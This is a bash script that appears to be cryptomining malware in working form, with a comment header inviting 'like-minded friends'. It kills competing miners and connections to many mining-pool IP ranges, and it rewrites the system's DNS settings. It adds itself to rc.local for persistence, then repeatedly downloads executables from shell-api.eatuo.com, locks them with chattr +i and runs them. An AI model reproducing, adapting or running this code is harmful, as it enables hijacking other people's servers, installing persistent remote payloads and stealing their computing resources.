#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qun:10776622
#                2016-06-14
cp -r /bin/ps /tmp/ps
cp -r /bin/netstat /tmp/netstat
pkill -9 minerd
pkill -9 xmrig
cd /var/tmp
echo "nameserver 8.8.8.8" >/etc/resolv.conf
echo "nameserver 8.8.4.4" >>/etc/resolv.conf
myid=`ps aux|grep 'muhsti in'|grep -v grep|awk -F" " '{print $2}'|awk -F"/" '{print $1}'`
ps aux|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
kill -9 `ps aux |grep "muhsti"|grep -v "muhsti in"|grep -v grep|awk -F" " '{print $2}'|awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 5.196.26 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 37.59.55 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 37.59.43 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 37.187.110 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 37.187.154 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 45.125.194 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 46.105.103 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 51.38.49 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 54.37.75 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 78.46.89 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 78.46.91 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 91.189.238 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 91.121.140 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 94.130.9 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 94.130.206 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 103.253.40 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 104.140.201 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 107.178.104 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 111.231.134 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 139.99.101 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 145.239.93 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 147.135.208 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 148.251.133 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 176.31.117 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 178.63.48 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 176.9.50 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 188.165.214 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 192.110.160 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 195.128.235 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 195.154.62 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 213.32.29 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`
kill -9 `netstat -antp | grep -v $myid | grep 212.232.25 | awk -F" " '{print $7}' | awk -F"/" '{print $1}'`

if [ "sh /etc/chongfu.sh &" = "$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/chongfu.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "/tmp/wanddo" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "/tmp/wanddo" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                #./curl -P . http://shell-api.eatuo.com/wanddo
                ./curl -k -o /tmp/wanddo  http://shell-api.eatuo.com/wanddo &> /dev/null
                chmod 755 /tmp/wanddo
                chattr +i /tmp/wanddo
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/wanddo &
        #./wanddo &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "wanddo" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/wanddo1" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/wanddo1" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                #./curl -P .  http://shell-api.eatuo.com/wanddo1
                ./curl -k -o /tmp/wanddo1  http://shell-api.eatuo.com/wanddo1 &> /dev/null
                chmod 755 /tmp/wanddo1
                chattr +i /tmp/wanddo1
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/wanddo1 &
        #./wanddo1 &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "wanddo1" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/wanddo2" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/wanddo2" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                #./curl -P .  http://shell-api.eatuo.com/wanddo1
                ./curl -k -o /tmp/wanddo2  http://shell-api.eatuo.com/wanddo2 &> /dev/null
                chmod 755 /tmp/wanddo2
                chattr +i /tmp/wanddo2
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/wanddo2 &
        #./wanddo1 &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "wanddo2" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

        Centos_ssh_killn=$(ps aux | grep "/tmp/Freebsd_25000" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/Freebsd_25000" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                #./curl -P .  http://shell-api.eatuo.com/wanddo1
                ./curl -k -o /tmp/Freebsd_25000  http://shell-api.eatuo.com/Freebsd_25000 &> /dev/null
                chmod 755 /tmp/Freebsd_25000
                chattr +i /tmp/Freebsd_25000
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/Freebsd_25000 &
        #./wanddo1 &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "Freebsd_25000" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

        Centos_ssh_killn=$(ps aux | grep -E "/tmp/proxy" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/proxy" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                ./curl -k -o /tmp/config.json http://shell-api.eatuo.com/config.json
                ./curl -k -o /tmp/proxy  http://shell-api.eatuo.com/proxy &> /dev/null
                chmod 755 /tmp/proxy
                chattr +i /tmp/proxy
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/proxy &
        #./wanddo1 &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "proxy|" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/wanwakuang" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/wanwakuang" ]; then
            if [ -f "/usr/bin/curl" ]; then
                cp /usr/bin/curl .
                chmod +x curl
                #./curl -P .  http://shell-api.eatuo.com/wanddo1
                ./curl -k -o /tmp/wanwakuang  http://shell-api.eatuo.com/wanwakuang &> /dev/null
                chmod 755 /tmp/wanwakuang
                chattr +i /tmp/wanwakuang
                rm curl -rf
            else
                echo "No curl"
            fi
        fi
        /tmp/wanwakuang &
        #./wanddo1 &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "wanwakuang" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 6000
done

